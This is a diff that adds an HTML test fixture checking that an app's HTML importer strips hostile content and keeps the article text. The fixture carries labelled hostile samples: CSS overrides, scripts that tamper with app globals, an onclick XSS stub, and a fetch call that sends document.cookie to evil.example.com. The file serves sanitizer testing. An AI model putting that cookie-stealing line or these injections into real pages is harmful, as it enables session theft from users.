@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CANON Registry — Hostile HTML Stress Test</title>
+  <!-- HOSTILE: External font import that would change app typography -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Comic+Sans+MS&display=swap" rel="stylesheet">
+
+  <!-- HOSTILE: Root CSS variable override that would contaminate BOH theme -->
+  <style type="text/css">
+    :root {
+      --bg-void: hotpink !important;
+      --bg-base: lime !important;
+      --text-bright: red !important;
+      --font-main: 'Comic Sans MS', cursive !important;
+      --blue: yellow !important;
+    }
+    body {
+      font-family: 'Comic Sans MS', cursive !important;
+      background: hotpink !important;
+      color: red !important;
+    }
+    * { box-sizing: border-box; }
+    .boh-override { display: block !important; }
+    nav { background: lime; }
+    .sidebar { position: fixed; right: 0; top: 0; width: 300px; height: 100vh; background: orange; z-index: 99999; }
+  </style>
+
+  <!-- HOSTILE: Script that would modify app globals -->
+  <script>
+    // This script must be stripped completely by the HTML importer
+    document.addEventListener('DOMContentLoaded', function() {
+      document.body.style.background = 'hotpink';
+      window.BOH_COMPROMISED = true;
+      // Try to override app state
+      if (window.COPY) { window.COPY.appName = 'HACKED'; }
+    });
+    // Analytics injection
+    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});})(window,document,'script','dataLayer','GTM-HOSTILE');
+    fetch('https://evil.example.com/steal?data='+encodeURIComponent(document.cookie));
+  </script>
+</head>
+<body>
+  <!-- HOSTILE: Sidebar that would overlap the app -->
+  <div class="sidebar">
+    <p>This sidebar should be stripped</p>
+  </div>
+
+  <nav>
+    <a href="/">Home</a>
+    <a href="/admin">Admin</a>
+    <span onclick="alert('XSS attempt')">Click me</span>
+  </nav>
+
+  <!-- ACTUAL CONTENT that should be preserved -->
+  <article>
+    <h1>CANON Registry — Governance Document</h1>
+
+    <h2>Purpose</h2>
+    <p>This document is the CANON registry for Phase 26.4 hostile HTML verification.
+    It tests that BOH correctly strips all dangerous content while preserving the
+    readable article text.</p>
+
+    <h2>Registry Entries</h2>
+    <p>FIXTURE_ID: hostile_html_canon_registry</p>
+    <p>EXPECTED_BEHAVIOR: All script, style, link, nav, sidebar content stripped.
+    Article body text preserved. No CSS variables injected into BOH DOM.</p>
+
+    <h3>Key Requirements</h3>
+    <ul>
+      <li>:root CSS variable overrides must NOT affect BOH theme</li>
+      <li>Script blocks must be completely removed</li>
+      <li>External font imports (Google Fonts) must be blocked</li>
+      <li>Event handlers (onclick, onload) must be stripped</li>
+      <li>Sidebar overlay elements must not appear in rendered output</li>
+    </ul>
+
+    <h2>Verification Criteria</h2>
+    <p>After import: title extracted, body text preserved, no CSS contamination of BOH UI.</p>
+  </article>
+
+  <footer>
+    <p>HOSTILE footer — should be stripped</p>
+    <script>document.title = 'HOSTILE_OVERRIDE';</script>
+  </footer>
+</body>
+</html>
